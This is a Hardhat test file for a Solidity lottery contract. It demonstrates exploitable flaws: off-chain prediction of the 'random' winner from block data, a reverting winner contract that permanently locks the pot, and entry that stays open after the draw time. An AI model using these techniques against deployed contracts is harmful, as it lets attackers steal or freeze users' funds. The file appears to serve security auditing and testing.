const { expect } = require("chai");
const { ethers, network } = require("hardhat");

const E = ethers.parseEther;
const DELAY = 100;

describe("LuckyDraw", function () {
  let draw, a, b, c, mallory;

  beforeEach(async () => {
    [, a, b, c, mallory] = await ethers.getSigners();
    const L = await ethers.getContractFactory("LuckyDraw");
    draw = await L.deploy(DELAY, E("1"));
    await draw.waitForDeployment();
  });

  afterEach(async () => {
    await network.provider.send("evm_setAutomine", [true]);
  });

  const warp = async (s) => {
    await network.provider.send("evm_increaseTime", [s]);
    await network.provider.send("evm_mine");
  };

  // ---------------------------------------------------------------
  // #1 Bad randomness: winner is computable before draw() is called
  // ---------------------------------------------------------------
  it("#1 winner can be predicted from public inputs", async () => {
    for (const s of [a, b, c]) await draw.connect(s).enter({ value: E("1") });
    await warp(DELAY + 100);

    // Attacker controls / knows timestamp and prevrandao of the next block.
    const T = (await ethers.provider.getBlock("latest")).timestamp + 10;
    const R = ethers.hexlify(ethers.randomBytes(32));
    await network.provider.send("hardhat_setPrevRandao", [R]);
    await network.provider.send("evm_setNextBlockTimestamp", [T]);

    // Recompute the contract's "random" number off-chain.
    const seed = BigInt(
      ethers.solidityPackedKeccak256(["uint256", "uint256", "uint256"], [T, R, 3])
    );
    const predicted = [a, b, c][Number(seed % 3n)].address;

    await draw.draw();
    expect(await draw.winner()).to.equal(predicted);
    // An attacker CONTRACT does this same calculation inside one tx and
    // reverts if it would lose, so it only ever pays gas, never loses a ticket.
  });

  // ---------------------------------------------------------------
  // #2 transfer() to a reverting winner blocks draw() forever
  // ---------------------------------------------------------------
  it("#2 a winner that rejects ETH locks the pot (DoS)", async () => {
    const R = await ethers.getContractFactory("RevertingEntrant");
    const bad = await R.deploy();
    await bad.waitForDeployment();

    // Only entrant, so it is guaranteed to be the winner.
    await bad.enter(await draw.getAddress(), { value: E("1") });
    await warp(DELAY + 1);

    await expect(draw.draw()).to.be.reverted;
    expect(await draw.drawn()).to.equal(false); // state rolled back
    expect(
      await ethers.provider.getBalance(await draw.getAddress())
    ).to.equal(E("1")); // pot stuck, every future draw() call reverts too
  });

  // ---------------------------------------------------------------
  // Extra: entry is still open after drawTime
  // ---------------------------------------------------------------
  it("extra: enter() still works after drawTime (no cutoff)", async () => {
    await draw.connect(a).enter({ value: E("1") });
    await warp(DELAY + 100);
    // Draw time has passed, yet new tickets are accepted, so an attacker
    // can wait, compute outcomes, and only enter if it helps them.
    await expect(draw.connect(mallory).enter({ value: E("1") })).to.not.be.reverted;
  });
});